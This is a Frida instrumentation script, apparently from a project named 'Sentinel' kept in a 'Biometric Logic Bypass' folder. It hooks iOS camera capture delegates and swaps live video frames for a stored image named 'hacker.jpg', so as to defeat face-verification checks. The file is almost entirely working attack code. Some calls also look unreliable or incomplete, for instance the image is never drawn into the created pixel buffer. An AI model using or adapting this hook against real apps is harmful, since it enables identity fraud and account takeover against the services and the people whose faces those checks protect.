/**
 * Sentinel Phase 8 — Task 8.3.x
 * Universal Camera Hijack (Framework-Level)
 * 
 * Hijacks AVCaptureVideoDataOutput delegate to swap CMSampleBuffer frames.
 */

"use strict";

const CameraHookConfig = {
  imagePath: "/Users/kadirarici/Desktop/Biometric Logic Bypass/Sentinel_Hook/.local/test-faces/hacker.jpg",
  verboseFrameLog: false,
};

let _pixelBufferCache = null;

function _buildPixelBufferFromImage(path) {
  if (_pixelBufferCache !== null) return _pixelBufferCache;

  const NSString = ObjC.classes.NSString;
  const UIImage = ObjC.classes.UIImage;
  const NSData = ObjC.classes.NSData;

  const nsData = NSData.dataWithContentsOfFile_(NSString.stringWithUTF8String_(path));
  if (nsData.isNil()) return NULL;

  const cgImage = UIImage.imageWithData_(nsData).CGImage();
  const width = parseInt(ObjC.api.CGImageGetWidth(cgImage));
  const height = parseInt(ObjC.api.CGImageGetHeight(cgImage));

  const addrCVP = Module.findExportByName("CoreVideo", "CVPixelBufferCreate");
  if (!addrCVP) return NULL;
  
  const CVPixelBufferCreate = new NativeFunction(addrCVP, "int", ["pointer","long","long","uint","pointer","pointer"]);
  const bufRef = Memory.alloc(8);
  CVPixelBufferCreate(NULL, width, height, 0x42475241, NULL, bufRef);
  _pixelBufferCache = bufRef.readPointer();
  return _pixelBufferCache;
}

function _swapSampleBuffer(originalBuf, syntheticPixelBuf) {
  if (syntheticPixelBuf.isNull()) return originalBuf;

  const addrCSBC = Module.findExportByName("CoreMedia", "CMSampleBufferCreateReadyWithImageBuffer");
  const addrCSGT = Module.findExportByName("CoreMedia", "CMSampleBufferGetFormatDescription");
  const addrCSGR = Module.findExportByName("CoreMedia", "CMSampleBufferGetSampleTimingInfoArray");

  if (!addrCSBC || !addrCSGT || !addrCSGR) return originalBuf;

  const CMSampleBufferCreateReadyWithImageBuffer = new NativeFunction(addrCSBC, "int", ["pointer","pointer","pointer","pointer","pointer","pointer"]);
  const fmtDesc = new NativeFunction(addrCSGT, "pointer", ["pointer"])(originalBuf);
  
  const timingInfo = Memory.alloc(24);
  new NativeFunction(addrCSGR, "int", ["pointer","long","pointer","pointer"])(originalBuf, 1, timingInfo, Memory.alloc(8));

  const outBuf = Memory.alloc(8);
  CMSampleBufferCreateReadyWithImageBuffer(NULL, syntheticPixelBuf, fmtDesc, timingInfo, outBuf, NULL);
  return outBuf.readPointer();
}

function attachCameraHook() {
  const addrCheck = Module.findExportByName("CoreMedia", "CMSampleBufferCreateReadyWithImageBuffer");
  if (!addrCheck) {
    console.log("[Sentinel][Camera] Warning: AVFoundation APIs not found in this process. Skipping hook.");
    return;
  }

  const syntheticPB = _buildPixelBufferFromImage(CameraHookConfig.imagePath);
  const sel = ObjC.selector("captureOutput:didOutputSampleBuffer:fromConnection:");

  ObjC.choose(ObjC.classes.NSObject, {
    onMatch(obj) {
      if (!obj.respondsToSelector_(sel)) return;
      try {
        Interceptor.attach(obj[sel].implementation, {
          onEnter(args) {
            args[3] = _swapSampleBuffer(args[3], syntheticPB);
          }
        });
        console.log(`[Sentinel][Camera] Hooked delegate: ${obj.$className}`);
      } catch (_) {}
    },
    onComplete() { console.log("[Sentinel][Camera] AVFoundation scan complete."); }
  });
}

module.exports = { attachCameraHook, CameraHookConfig };
